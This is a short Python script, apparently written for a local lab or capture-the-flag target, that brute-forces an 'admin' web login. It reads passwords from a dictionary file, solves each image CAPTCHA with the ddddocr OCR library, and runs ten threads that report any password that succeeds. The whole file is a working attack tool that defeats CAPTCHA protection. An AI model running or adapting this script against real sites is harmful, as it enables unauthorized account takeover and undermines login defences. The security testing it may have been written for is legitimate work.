import requests
import queue
import threading
import ddddocr
import re
import json

ocr = ddddocr.DdddOcr()
url = "http://127.0.0.1:8001/index.php?s=captcha"
myqueue = queue.Queue()

def getCode(session):
    r = session.get(url).content
    img = r
    image_bytes = img
    res = ocr.classification(image_bytes)
    code = res.upper()
    return code
    
class attack(threading.Thread):
    def __init__(self,queue):
        threading.Thread.__init__(self)
        self._queue = queue
    def run(self):
        while not self._queue.empty():
            password=self._queue.get()
            try:
                self.check(password)
            except Exception as e:
                print(e)
    def check(self,password):
        session = requests.session()
        url = "http://127.0.0.1:8001/index.php?s=login"
        data = {
            "username":"admin",
            "password":"%s"%(password),
            "code":"%s"%(getCode(session))
        }
        r = session.post(url, data=data)
        if 'list' in r.text:
            print(password)
            print('success')
     
if __name__ == "__main__":
	f=open('dict.txt','r')
	for i in f:
	    myqueue.put(i.strip('\n'))
	thread = []
	for i in range(0,10):
	    thread.append(attack(myqueue))
	for t in thread:
	    t.start()
	for j in thread:
	    j.join()